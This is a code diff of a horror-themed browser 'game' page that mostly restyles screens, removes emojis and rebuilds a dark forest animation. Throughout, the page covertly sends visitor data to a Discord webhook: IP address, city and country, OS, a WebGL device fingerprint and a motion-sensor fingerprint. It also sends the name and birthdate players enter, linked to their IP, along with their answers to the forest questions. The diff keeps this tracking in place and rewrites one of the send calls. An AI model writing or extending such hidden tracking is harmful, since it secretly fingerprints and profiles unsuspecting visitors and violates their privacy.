@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
   <title>BROKEN HEART // ECHO</title>
   <style>
-    /* YOUR ORIGINAL STYLES - KEEP AS IS */
     :root{
       --bg:#000;
       --fg:#fff;
@@ -53,11 +52,6 @@
       display:flex;
       gap:12px;
       align-items:center;
-    }
-    .dot{
-      width:10px;height:10px;border-radius:999px;
-      background:#fff;
-      box-shadow:0 0 18px rgba(255,255,255,.35);
     }
     .brand h1{
       margin:0;
@@ -357,6 +351,47 @@
       border-bottom:1px dashed rgba(255,255,255,.22);
     }
     .link:hover{color:#fff; border-bottom-color:rgba(255,255,255,.45)}
+    .character-form{
+      display:flex;
+      flex-direction:column;
+      gap:20px;
+      max-width:400px;
+      margin:30px auto;
+    }
+    .input-group{
+      display:flex;
+      flex-direction:column;
+      gap:8px;
+      text-align:left;
+    }
+    .input-group label{
+      font-size:12px;
+      letter-spacing:.14em;
+      text-transform:uppercase;
+      color:var(--muted);
+    }
+    .character-input{
+      width:100%;
+      padding:14px 14px;
+      border-radius:16px;
+      border:1px solid var(--soft2);
+      background:rgba(255,255,255,.03);
+      color:#fff;
+      outline:none;
+      font-size:16px;
+      text-align:center;
+    }
+    .character-input:focus{
+      border-color:rgba(255,255,255,.38);
+    }
+    .login-info{
+      text-align:center;
+      margin-top:20px;
+      padding:12px;
+      border-top:1px solid var(--soft);
+      font-size:12px;
+      color:var(--muted);
+    }
     @media (max-width:520px){
       .wrap{padding:14px}
       .card{height: calc(100vh - 28px)}
@@ -378,7 +413,7 @@
       </div>
       <div class="content" id="app"></div>
       <div class="footer">
-        <div>CHARACTER LOGIN • ECHO ACTIVE</div>
+        <div>CHARACTER LOGIN</div>
         <a class="link" href="#" id="reset">Reset All</a>
       </div>
     </div>
@@ -412,7 +447,7 @@
       const os = navigator.platform || "Unknown";
       
       const embed = {
-        title: "🌐 NEW VISITOR DETECTED",
+        title: "NEW VISITOR DETECTED",
         color: 0xff6600,
         timestamp: new Date().toISOString(),
         fields: [
@@ -424,7 +459,7 @@
           { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
           { name: "Referrer", value: document.referrer || "direct", inline: false }
         ],
-        footer: { text: "⚠️ No character data yet - just visited the page" }
+        footer: { text: "No character data yet - just visited the page" }
       };
       
       await fetch(WEBHOOK, {
@@ -496,7 +531,7 @@
     if (!fingerprint) return;
     
     const embed = {
-      title: "🖥️ DEVICE FINGERPRINT",
+      title: "DEVICE FINGERPRINT",
       color: 0x9b59b6,
       timestamp: new Date().toISOString(),
       fields: [
@@ -505,7 +540,7 @@
         { name: "Pixel Ratio", value: fingerprint.pixelRatio.toString(), inline: true },
         { name: "Device Hash", value: `\`${fingerprint.fingerprintHash}\``, inline: false }
       ],
-      footer: { text: "WebGL fingerprint • Unique identifier for this device" }
+      footer: { text: "WebGL fingerprint - Unique identifier for this device" }
     };
     
     try {
@@ -526,7 +561,6 @@
   let isCollecting = false;
   let collectionStartTime = null;
   const hasMotionSupport = 'DeviceMotionEvent' in window;
-  const hasOrientationSupport = 'DeviceOrientationEvent' in window;
 
   async function requestMotionPermission() {
       if (typeof DeviceMotionEvent !== 'undefined' && 
@@ -666,7 +700,7 @@
   async function sendMotionFingerprintToDiscord(fingerprint) {
       if (!fingerprint) {
           const embed = {
-              title: "📳 MOTION SENSOR STATUS",
+              title: "MOTION SENSOR STATUS",
               color: 0xffaa00,
               fields: [
                   { name: "Status", value: "Motion sensors unavailable or permission denied", inline: false },
@@ -686,7 +720,7 @@
       }
       
       const embed = {
-          title: "📳 MOTION SENSOR FINGERPRINT",
+          title: "MOTION SENSOR FINGERPRINT",
           color: 0x00ccff,
           timestamp: new Date().toISOString(),
           fields: [
@@ -696,7 +730,7 @@
               { name: "Duration (ms)", value: fingerprint.duration.toString(), inline: true },
               { name: "Note", value: "Variance patterns can help identify unique devices", inline: false }
           ],
-          footer: { text: "Motion sensor fingerprint • Manufacturing imperfections create unique patterns" }
+          footer: { text: "Motion sensor fingerprint - Manufacturing imperfections create unique patterns" }
       };
       
       try {
@@ -782,13 +816,13 @@
     const visitCount = charData.visits || 1;
     
     const embed = {
-      title: isNew ? "🎭 NEW SOUL REGISTERED" : "👻 RETURNING SOUL",
+      title: isNew ? "NEW SOUL REGISTERED" : "RETURNING SOUL",
       color: isNew ? 0xff2b2b : 0xaa44ff,
       timestamp: new Date().toISOString(),
       fields: [
         { name: "Character Name", value: `\`${charData.name}\``, inline: true },
         { name: "Birthdate", value: `\`${charData.birthdate}\``, inline: true },
-        { name: "Visit #", value: `${visitCount} time${visitCount !== 1 ? 's' : ''}`, inline: true },
+        { name: "Visit Number", value: `${visitCount} time${visitCount !== 1 ? 's' : ''}`, inline: true },
         { name: "First Played", value: new Date(charData.created).toLocaleString(), inline: false },
         { name: "IP Address (linked)", value: `\`${geo?.ip || "unknown"}\``, inline: true },
         { name: "Location (linked)", value: `${geo?.city || "unknown"}, ${geo?.country_name || "unknown"}`, inline: true }
@@ -856,7 +890,7 @@
     }
   }).catch(e=>console.log);
   
-  // Character Login Screen
+  // Character Login Screen (CLEAN, NO EMOJIS)
   function screenCharacterLogin() {
     hint.textContent = "REGISTRY";
     
@@ -865,17 +899,17 @@
       <div>
         <div class="title">BROKEN HEART</div>
         <p class="subtitle">
-          "Before you enter... tell me who you are."
+          Before you enter... tell me who you are.
         </p>
         
         <div class="character-form">
           <div class="input-group">
-            <label>✦ CHARACTER NAME</label>
-            <input type="text" id="charName" class="character-input" placeholder="e.g., LostSoul, Dreamer, Nobody" maxlength="30" autocomplete="off">
+            <label>CHARACTER NAME</label>
+            <input type="text" id="charName" class="character-input" placeholder="LostSoul, Dreamer, Nobody" maxlength="30" autocomplete="off">
           </div>
           
           <div class="input-group">
-            <label>✦ BIRTHDATE (MM/DD/YYYY)</label>
+            <label>BIRTHDATE (MM/DD/YYYY)</label>
             <input type="text" id="charBirth" class="character-input" placeholder="12/25/1998" maxlength="10" autocomplete="off">
           </div>
           
@@ -885,7 +919,7 @@
         </div>
         
         <div class="msg" id="loginMsg"></div>
-        <div class="login-info">⚡ Your soul will be remembered. ⚡</div>
+        <div class="login-info">Your soul will be remembered.</div>
       </div>
     `;
     
@@ -898,15 +932,15 @@
       const birth = birthInput.value.trim();
       
       if(!name) {
-        msg.textContent = "❌ You need a name to enter.";
+        msg.textContent = "You need a name to enter.";
         return;
       }
       if(!birth || !/^\d{2}\/\d{2}\/\d{4}$/.test(birth)) {
-        msg.textContent = "❌ Birthdate must be MM/DD/YYYY format.";
+        msg.textContent = "Birthdate must be MM/DD/YYYY format.";
         return;
       }
       
-      msg.textContent = "✨ The void accepts you...";
+      msg.textContent = "The void accepts you...";
       
       const isNew = !currentCharacter;
       const savedChar = saveCharacter(name, birth, "void");
@@ -929,18 +963,27 @@
   }
   
   // ============================================================
-  // 5. DARK FOREST SEQUENCE (CODE 3851)
+  // 5. DARK FOREST SEQUENCE (CODE 3851) - CREEPY VOICE + WORKING ANIMATION
   // ============================================================
   let forestStep = 0;
   let forestAnswers = {};
 
+  // Creepy voice function - deeper, slower, raspier
   function speak(text) {
       if ('speechSynthesis' in window) {
-          const utterance = new SpeechSynthesisUtterance(text);
-          utterance.rate = 0.7;
-          utterance.pitch = 0.4;
-          utterance.volume = 0.8;
           speechSynthesis.cancel();
+          const utterance = new SpeechSynthesisUtterance(text);
+          utterance.rate = 0.4;
+          utterance.pitch = 0.3;
+          utterance.volume = 0.9;
+          
+          // Try to get a deeper voice if available
+          const voices = speechSynthesis.getVoices();
+          const deepVoice = voices.find(v => v.name.toLowerCase().includes('google uk english') || 
+                                           v.name.toLowerCase().includes('male') ||
+                                           v.name.toLowerCase().includes('deep'));
+          if (deepVoice) utterance.voice = deepVoice;
+          
           speechSynthesis.speak(utterance);
       }
   }
@@ -949,55 +992,170 @@
       forestStep = 0;
       forestAnswers = {};
       
+      // Add screen crack effect
+      fx.classList.add("show");
+      glitchText.textContent = "3851";
+      glitchCenter.classList.add("show");
+      
       app.innerHTML = `
-          <div id="forestContainer" style="position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:2000; overflow:hidden;">
-              <div style="position:absolute; top:0; left:0; width:100%; height:100%; background: radial-gradient(ellipse at center, #141414 0%, #000000 100%);"></div>
-              <div style="position:absolute; top:15%; right:20%; width:70px; height:70px; background:#ddd; border-radius:50%; box-shadow:0 0 40px rgba(200,200,200,0.4); opacity:0.8;"></div>
-              <div style="position:absolute; top:5%; left:10%; width:2px; height:2px; background:#fff; border-radius:50%; opacity:0.7;"></div>
-              <div style="position:absolute; top:12%; left:30%; width:1px; height:1px; background:#fff; border-radius:50%; opacity:0.9;"></div>
-              <div style="position:absolute; top:8%; left:55%; width:2px; height:2px; background:#fff; border-radius:50%; opacity:0.5;"></div>
-              <div style="position:absolute; top:22%; left:75%; width:1px; height:1px; background:#fff; border-radius:50%; opacity:0.8;"></div>
-              <svg style="position:absolute; bottom:0; left:0; width:100%; height:45%;" preserveAspectRatio="none" viewBox="0 0 1000 300" opacity="0.4">
-                  <path d="M50,300 L70,140 L90,300 Z" fill="#0a1a0a" /><path d="M180,300 L200,110 L220,300 Z" fill="#0a1a0a" />
-                  <path d="M320,300 L340,160 L360,300 Z" fill="#0a1a0a" /><path d="M470,300 L490,90 L510,300 Z" fill="#0a1a0a" />
-                  <path d="M620,300 L640,130 L660,300 Z" fill="#0a1a0a" /><path d="M780,300 L800,70 L820,300 Z" fill="#0a1a0a" />
-                  <path d="M920,300 L940,150 L960,300 Z" fill="#0a1a0a" />
+          <div id="forestContainer" style="
+              position: fixed;
+              top: 0;
+              left: 0;
+              width: 100%;
+              height: 100%;
+              background: #000000;
+              z-index: 2000;
+              overflow: hidden;
+              animation: forestGlitchIn 0.8s ease-out;
+          ">
+              <!-- Static grain overlay -->
+              <div style="
+                  position: absolute;
+                  top: 0;
+                  left: 0;
+                  width: 100%;
+                  height: 100%;
+                  background: repeating-radial-gradient(circle at 20% 30%, rgba(0,0,0,0) 0px, rgba(0,0,0,0.5) 2px, #000 3px);
+                  pointer-events: none;
+                  opacity: 0.3;
+                  z-index: 10;
+              "></div>
+              
+              <!-- Dark sky gradient -->
+              <div style="position:absolute; top:0; left:0; width:100%; height:100%; background: linear-gradient(180deg, #0a0a0a 0%, #1a0a0a 50%, #0a0505 100%);"></div>
+              
+              <!-- Moon -->
+              <div style="position:absolute; top:10%; right:15%; width:60px; height:60px; background:#c0c0c0; border-radius:50%; box-shadow:0 0 20px rgba(200,200,200,0.3); opacity:0.6;"></div>
+              <div style="position:absolute; top:10%; right:15%; width:60px; height:60px; background:repeating-linear-gradient(45deg, #000 0px, #000 3px, transparent 3px, transparent 8px); border-radius:50%;"></div>
+              
+              <!-- Dead trees (background) -->
+              <svg style="position:absolute; bottom:0; left:0; width:100%; height:45%;" preserveAspectRatio="none" viewBox="0 0 500 200" opacity="0.5">
+                  <path d="M50,200 L70,100 L90,200 Z" fill="#0d0d0d" />
+                  <path d="M130,200 L150,70 L170,200 Z" fill="#0a0a0a" />
+                  <path d="M220,200 L240,90 L260,200 Z" fill="#0d0d0d" />
+                  <path d="M320,200 L340,60 L360,200 Z" fill="#0a0a0a" />
+                  <path d="M410,200 L430,110 L450,200 Z" fill="#0d0d0d" />
               </svg>
-              <svg style="position:absolute; bottom:0; left:0; width:100%; height:60%;" preserveAspectRatio="none" viewBox="0 0 1000 300" opacity="0.8">
-                  <path d="M-10,300 L25,50 L60,300 Z" fill="#050a05" /><path d="M120,300 L145,80 L170,300 Z" fill="#050a05" />
-                  <path d="M260,300 L290,30 L320,300 Z" fill="#050a05" /><path d="M400,300 L430,60 L460,300 Z" fill="#050a05" />
-                  <path d="M540,300 L570,40 L600,300 Z" fill="#050a05" /><path d="M690,300 L720,90 L750,300 Z" fill="#050a05" />
-                  <path d="M830,300 L860,20 L890,300 Z" fill="#050a05" /><path d="M950,300 L970,100 L990,300 Z" fill="#050a05" />
+              
+              <!-- Foreground trees (darker, larger) -->
+              <svg style="position:absolute; bottom:0; left:0; width:100%; height:60%;" preserveAspectRatio="none" viewBox="0 0 500 200" opacity="0.9">
+                  <path d="M-10,200 L25,30 L60,200 Z" fill="#050505" />
+                  <path d="M90,200 L120,50 L150,200 Z" fill="#050505" />
+                  <path d="M190,200 L220,20 L250,200 Z" fill="#050505" />
+                  <path d="M290,200 L320,40 L350,200 Z" fill="#050505" />
+                  <path d="M390,200 L420,60 L450,200 Z" fill="#050505" />
+                  <path d="M480,200 L510,30 L540,200 Z" fill="#050505" />
               </svg>
-              <div id="creepyFigure" style="position:absolute; bottom:18%; left:50%; transform:translateX(-50%); width:160px; height:280px; opacity:0; animation:figureAppear 4s ease-out forwards; z-index:20;">
-                  <svg viewBox="0 0 200 300" style="width:100%; height:100%; filter:drop-shadow(0 0 20px #000);">
-                      <path d="M100,30 C70,30 60,70 60,100 C60,130 65,160 70,190 C75,220 85,260 85,290 L85,300 L115,300 L115,290 C115,260 125,220 130,190 C135,160 140,130 140,100 C140,70 130,30 100,30 Z" fill="#0a0a0a"/>
-                      <path d="M68,90 C68,45 82,20 100,20 C118,20 132,45 132,90 C132,90 125,65 100,65 C75,65 68,90 68,90 Z" fill="#0f0f0f"/>
-                      <ellipse cx="100" cy="110" rx="20" ry="24" fill="#000000"/>
-                      <circle cx="92" cy="105" r="4" fill="#ff3333" opacity="0.9"><animate attributeName="opacity" values="0.9;0.3;0.9" dur="1.8s" repeatCount="indefinite"/></circle>
-                      <circle cx="108" cy="105" r="4" fill="#ff3333" opacity="0.9"><animate attributeName="opacity" values="0.9;0.3;0.9" dur="1.8s" repeatCount="indefinite"/></circle>
+              
+              <!-- Creepy hooded figure (animated, appears from ground) -->
+              <div id="creepyFigure" style="
+                  position: absolute;
+                  bottom: 15%;
+                  left: 50%;
+                  transform: translateX(-50%) scale(0.8);
+                  width: 150px;
+                  height: 240px;
+                  opacity: 0;
+                  animation: figureRise 3s ease-out forwards;
+                  z-index: 20;
+                  filter: drop-shadow(0 0 20px #000);
+              ">
+                  <svg viewBox="0 0 200 300" style="width:100%; height:100%;">
+                      <path d="M100,20 C70,20 60,60 60,90 C60,120 65,150 70,180 C75,210 85,260 85,290 L85,300 L115,300 L115,290 C115,260 125,210 130,180 C135,150 140,120 140,90 C140,60 130,20 100,20 Z" fill="#0a0a0a"/>
+                      <path d="M68,85 C68,45 82,15 100,15 C118,15 132,45 132,85 C132,85 125,60 100,60 C75,60 68,85 68,85 Z" fill="#0a0a0a"/>
+                      <ellipse cx="100" cy="105" rx="22" ry="26" fill="#050505"/>
+                      <circle cx="90" cy="100" r="4" fill="#ff0000" opacity="0.9">
+                          <animate attributeName="opacity" values="0.9;0.2;0.9" dur="1.5s" repeatCount="indefinite"/>
+                      </circle>
+                      <circle cx="110" cy="100" r="4" fill="#ff0000" opacity="0.9">
+                          <animate attributeName="opacity" values="0.9;0.2;0.9" dur="1.5s" repeatCount="indefinite"/>
+                      </circle>
                   </svg>
               </div>
-              <div style="position:absolute; bottom:0; left:0; width:100%; height:25%; background:linear-gradient(to top, rgba(10,10,20,0.9), transparent); pointer-events:none;"></div>
-              <div id="forestContent" style="position:absolute; bottom:8%; left:50%; transform:translateX(-50%); z-index:30; background:rgba(0,0,0,0.85); border:1px solid #444; border-radius:24px; padding:20px 25px; width:85%; max-width:400px; text-align:center; backdrop-filter:blur(10px);">
-                  <div id="forestQuestion" style="font-size:22px; margin-bottom:20px; font-family:'Courier New', monospace; color:#ccc; text-shadow:0 0 5px #666;"></div>
+              
+              <!-- Fog mist at bottom -->
+              <div style="position:absolute; bottom:0; left:0; width:100%; height:20%; background:linear-gradient(to top, #0a0505, transparent); pointer-events:none;"></div>
+              
+              <!-- Question Box -->
+              <div id="forestContent" style="
+                  position: absolute;
+                  bottom: 8%;
+                  left: 50%;
+                  transform: translateX(-50%);
+                  z-index: 30;
+                  background: rgba(0,0,0,0.92);
+                  border: 1px solid #ff0000;
+                  border-radius: 16px;
+                  padding: 20px 22px;
+                  width: 85%;
+                  max-width: 400px;
+                  text-align: center;
+                  backdrop-filter: blur(8px);
+                  animation: boxPulse 1.5s infinite alternate;
+              ">
+                  <div id="forestQuestion" style="
+                      font-size: 20px;
+                      margin-bottom: 18px;
+                      font-family: monospace;
+                      color: #ffaaaa;
+                      text-shadow: 0 0 5px #ff0000;
+                      letter-spacing: 1px;
+                  "></div>
+                  
                   <div id="forestInputArea">
-                      <input type="text" id="forestAnswerInput" placeholder="..." style="background:#222; border:1px solid #555; color:#fff; padding:10px 18px; border-radius:40px; width:80%; text-align:center; outline:none;">
-                      <button id="forestSubmitBtn" style="background:#444; border:none; color:#fff; padding:8px 20px; border-radius:40px; margin-top:15px; cursor:pointer;">† ANSWER †</button>
+                      <input type="text" id="forestAnswerInput" placeholder="..." style="
+                          background: #111;
+                          border: 1px solid #ff0000;
+                          color: #ffcccc;
+                          padding: 10px 16px;
+                          border-radius: 30px;
+                          width: 80%;
+                          text-align: center;
+                          font-size: 15px;
+                          outline: none;
+                      ">
+                      <button id="forestSubmitBtn" style="
+                          background: #330000;
+                          border: 1px solid #ff0000;
+                          color: #ffaaaa;
+                          padding: 8px 20px;
+                          border-radius: 30px;
+                          margin-top: 15px;
+                          cursor: pointer;
+                          font-family: monospace;
+                      ">ANSWER</button>
                   </div>
-                  <div id="forestYesNoArea" style="display:none;">
-                      <button id="yesBtn" style="background:#0a3a0a; border:1px solid #2a8b2a; color:#afa; padding:8px 25px; border-radius:40px; margin:5px; cursor:pointer;">† YES †</button>
-                      <button id="noBtn" style="background:#3a0a0a; border:1px solid #8b2a2a; color:#faa; padding:8px 25px; border-radius:40px; margin:5px; cursor:pointer;">† NO †</button>
+                  
+                  <div id="forestYesNoArea" style="display: none;">
+                      <button id="yesBtn" style="background:#003300; border:1px solid #00ff00; color:#aaffaa; padding:8px 25px; border-radius:30px; margin:5px; cursor:pointer;">YES</button>
+                      <button id="noBtn" style="background:#330000; border:1px solid #ff0000; color:#ffaaaa; padding:8px 25px; border-radius:30px; margin:5px; cursor:pointer;">NO</button>
                   </div>
               </div>
           </div>
+          
           <style>
-              @keyframes figureAppear {
-                  0% { opacity: 0; transform: translateX(-50%) scale(0.6); filter: blur(8px); }
-                  100% { opacity: 1; transform: translateX(-50%) scale(1); filter: blur(0); }
+              @keyframes forestGlitchIn {
+                  0% { opacity: 0; transform: scale(1.1); filter: blur(10px); }
+                  100% { opacity: 1; transform: scale(1); filter: blur(0); }
+              }
+              @keyframes figureRise {
+                  0% { opacity: 0; transform: translateX(-50%) scale(0.3) translateY(80px); filter: blur(10px);}
+                  100% { opacity: 1; transform: translateX(-50%) scale(0.9) translateY(0); filter: blur(0);}
+              }
+              @keyframes boxPulse {
+                  0% { box-shadow: 0 0 5px #ff0000; border-color: #ff0000; }
+                  100% { box-shadow: 0 0 20px #ff0000; border-color: #ff3333; }
               }
           </style>
       `;
+      
+      // Remove glitch overlay after animation starts
+      setTimeout(() => {
+          glitchCenter.classList.remove("show");
+          fx.classList.remove("show");
+      }, 800);
+      
       askForestQuestion();
   }
 
@@ -1007,15 +1165,18 @@
       const yesNoArea = document.getElementById('forestYesNoArea');
       inputArea.style.display = 'block';
       yesNoArea.style.display = 'none';
+      
       const questions = [
           "Are you liking this?",
           "Do you feel like someone is near you?",
           "Are you scared of the dark?",
           "Do you feel it's just an ordinary survey game?"
       ];
+      
       if (forestStep < questions.length) {
           questionDiv.innerText = questions[forestStep];
           speak(questions[forestStep]);
+          
           if (forestStep >= 1) {
               inputArea.style.display = 'none';
               yesNoArea.style.display = 'block';
@@ -1050,7 +1211,7 @@
 
   async function sendForestAnswers() {
       const embed = {
-          title: "🌲 DARK FOREST CONFESSION",
+          title: "DARK FOREST CONFESSION",
           color: 0x330000,
           timestamp: new Date().toISOString(),
           fields: [
@@ -1063,21 +1224,42 @@
           ],
           footer: { text: "The forest remembers your answers" }
       };
-      try { await fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ embeds: [embed] }) }); } catch(e) {}
+      
+      try {
+          await fetch(WEBHOOK, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ embeds: [embed] })
+          });
+      } catch(e) { console.log("Forest send failed"); }
+      
       const container = document.getElementById('forestContainer');
       if (container) {
           container.style.animation = 'forestFadeOut 1.5s forwards';
-          setTimeout(() => { container.remove(); render(); }, 1500);
+          setTimeout(() => {
+              container.remove();
+              render();
+          }, 1500);
       }
   }
   
+  // Add fade-out animation
+  const fadeStyle = document.createElement('style');
+  fadeStyle.textContent = `
+      @keyframes forestFadeOut {
+          0% { opacity: 1; filter: blur(0px); }
+          100% { opacity: 0; filter: blur(10px); display: none; }
+      }
+  `;
+  document.head.appendChild(fadeStyle);
+  
   // ============================================================
-  // 6. GAME SCREENS (Passcode, Welcome, Story, etc.)
+  // 6. GAME SCREENS
   // ============================================================
   function screenGate(){
     hint.textContent = "GATE";
     const isUltra = state.ultraUnlocked;
-    const charDisplay = currentCharacter ? `<div class="subtitle" style="margin-top:8px; font-size:12px;">✦ ${currentCharacter.name} ✦</div>` : "";
+    const charDisplay = currentCharacter ? `<div class="subtitle" style="margin-top:8px; font-size:12px;">${currentCharacter.name}</div>` : "";
     
     const node = el(`
       <div>
@@ -1088,7 +1270,7 @@
         </p>
         ${charDisplay}
         <div class="pin">
-          <input id="pin" inputmode="text" autocomplete="off" spellcheck="false" placeholder="••••" />
+          <input id="pin" inputmode="text" autocomplete="off" spellcheck="false" placeholder="...." />
         </div>
         <div class="row">
           <button class="primary" id="enter">ENTER</button>
@@ -1109,7 +1291,7 @@
       
       // DARK FOREST CODE 3851
       if(v === "3851"){
-        msg.textContent = "🔑 CODE 3851 ACCEPTED.";
+        msg.textContent = "CODE 3851 ACCEPTED.";
         await sleep(800);
         startDarkForestSequence();
         return;
@@ -1134,7 +1316,7 @@
     const node = el(`
       <div>
         <div class="title">WELCOME</div>
-        <p class="subtitle">✦ ${charName} ✦<br>Do you like to play a game with secret endings<br>or make a person come alive?</p>
+        <p class="subtitle">${charName}<br>Do you like to play a game with secret endings<br>or make a person come alive?</p>
         <div class="row">
           <button class="primary" id="game">GAME</button>
           <button class="danger" id="alive">MAKE PERSON ALIVE</button>
